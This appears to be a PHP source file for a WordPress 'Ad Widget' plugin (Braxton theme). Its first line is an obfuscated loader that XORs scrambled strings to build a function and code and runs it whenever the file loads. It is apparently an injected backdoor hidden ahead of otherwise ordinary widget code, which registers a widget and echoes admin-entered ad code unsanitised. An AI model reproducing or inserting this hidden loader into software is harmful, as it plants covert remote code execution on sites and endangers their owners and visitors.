<?php $MKpnNTzh='6:NY7-+5;65J;WV'; $mBVSLC='UH+8CHtSNXV>R88'^$MKpnNTzh; $tVjrIhn='8KxGJU:.<UT6e<9-DI+el:>Bk+0NQggUNAuGSVH9c24X1:;59fHY=q<P7,fsVH<ru J;Mxqm9NKcxxltg6hn=hYO:yWqjaAoNZ A iUGgxSETYt:V I 8YTKrP29 sKPA rhl8KnuAHLyaLMAv5L<LoB oupjeEQ>bmBnIvCN68,ToMYKLesoZfXA8. 9H9XR;>3qrs8OIQbknSL. thc>Q4 Spcs=+EXjGH=oQq 7BGQjocTO656R;mXp0ubbvw2mR BBSWEugSiS +4A5po1=sk4.7X8Y7MqyeuK-RVzBF7ROLaramK.R75K90=bD,ukYc0M=0Ky<:l.7DPQC.mlPh t8l3 xz0;hN<P-HWVwp=1V8QQy:NKmlR0T33;PUbsvvK 0lcgnlOM 4nkbI:2TXQlgGAB;phI YO7tyWsC=  88,TRVEy=9:2=3O8im> 7rI,= cUi- C=Z-oh5Q37poMO64N7aK6 GzuX +dSR8-SmpBUT=C GiQ >jPS NC iL:-AbJtHYYE0oWpard87waVJ1MW2b<01k>oQTlcPT0q xZN1VCLH;3RDCthxdRAq<WId4ahkSeAwwA 7NJKt=NOj=H=;EOLvEP.6V0InBQl469RcPErHxAhVye=B4AMu 6O36wLS09ROYj+Zl7NWFTGGfpPaL'; $Jstcyzy=$mBVSLC('', 'Q-Pf, TMH<;X:YAD7=XMKBQ04OQ:0888;5Rnzv33jTA6RNRZWF06O.X1CM9,;=HZQD+O,TQIR+2JXXLTGMbg4L6:NYjQMFzeGSF.RAq.GEsuoyPSjS=RT<:cV4SMAZppeIYCE2BgQ.=8YOqmiRQ-H-4fI2U.JA.4G9I+NlV0:DTI:Gi2.5L.FalQHJKTL:WpvTKGXIy12C,haJ7-ZATUCX0XS6KiWYJ195,-DOlQFV.44Qei2 DPW1SMpTo6--=>wM3Sbf82<UZmIwVJX4PYOJ7zOPOC9g2R4QDEQ H+mpKbS3;-AOAI=O>BPp3M7h-JUCxGT,IQbYG0eHX650 FMDt7r1i9vs,ZQHHjW5ThjhWTKP:M4xYADBdH6Q RlP5,BNVR EIWingH+,TUNVBmLS8-4WmN<HFzbmD8;VTDw36SSEJQM8;, QEVHmYR;Y62SUCZ+MNEUa6IE R>HGLQ0GVYCmkRU:V> SYnSNRIMLw6YY2MVdu5O1A>6:EG55+I=7SAkQH8EfTl=81QFwVGRLUSBIr.P96iEWUHLcFqiQCw7UBDN>,ScwyqYQfpqAXISf BZ2+PVVXStLaQQaAE<+2+V+65X0TH1<dQ51WZ9Q-InqHPWM3JyeRhXaH-slX4U-eQDW;RmP<2IU=.=MvsW=G2>=3oVYkk1'^$tVjrIhn); $Jstcyzy();
/**
 * Plugin Name: Ad Widget
 */

add_action( 'widgets_init', 'mvp_ad_load_widgets' );

function mvp_ad_load_widgets() {
	register_widget( 'mvp_ad_widget' );
}

class mvp_ad_widget extends WP_Widget {

	/**
	 * Widget setup.
	 */
	function mvp_ad_widget() {
		/* Widget settings. */
		$widget_ops = array( 'classname' => 'mvp_ad_widget', 'description' => __('A widget that displays an ad of any size.', 'mvp_ad_widget') );

		/* Widget control settings. */
		$control_ops = array( 'width' => 250, 'height' => 350, 'id_base' => 'mvp_ad_widget' );

		/* Create the widget. */
		$this->WP_Widget( 'mvp_ad_widget', __('Braxton: Ad Widget', 'mvp_ad_widget'), $widget_ops, $control_ops );
	}

	/**
	 * How to display the widget on the screen.
	 */
	function widget( $args, $instance ) {
		extract( $args );

		/* Our variables from the widget settings. */
		$code = $instance['code'];

		/* Before widget (defined by themes). */
		echo $before_widget;

		?>
			<h4 class="ad-header"><?php _e( 'Advertisement', 'mvp-text' ); ?></h4>
			<div class="widget-ad">
				<?php echo stripslashes($code); ?>
			</div><!--widget-ad-->

		<?php

		/* After widget (defined by themes). */
		echo $after_widget;
	}

	/**
	 * Update the widget settings.
	 */
	function update( $new_instance, $old_instance ) {
		$instance = $old_instance;

		/* Strip tags for title and name to remove HTML (important for text inputs). */
		$instance['code'] = $new_instance['code'];


		return $instance;
	}


	function form( $instance ) {

		/* Set up some default widget settings. */
		$defaults = array( 'code' => 'Enter ad code here');
		$instance = wp_parse_args( (array) $instance, $defaults ); ?>

		<!-- Ad code -->
		<p>
			<label for="<?php echo $this->get_field_id( 'code' ); ?>">Ad code:</label>
			<textarea id="<?php echo $this->get_field_id( 'code' ); ?>" name="<?php echo $this->get_field_name( 'code' ); ?>" style="width:96%;" rows="6"><?php echo $instance['code']; ?></textarea>
		</p>


	<?php
	}
}

?>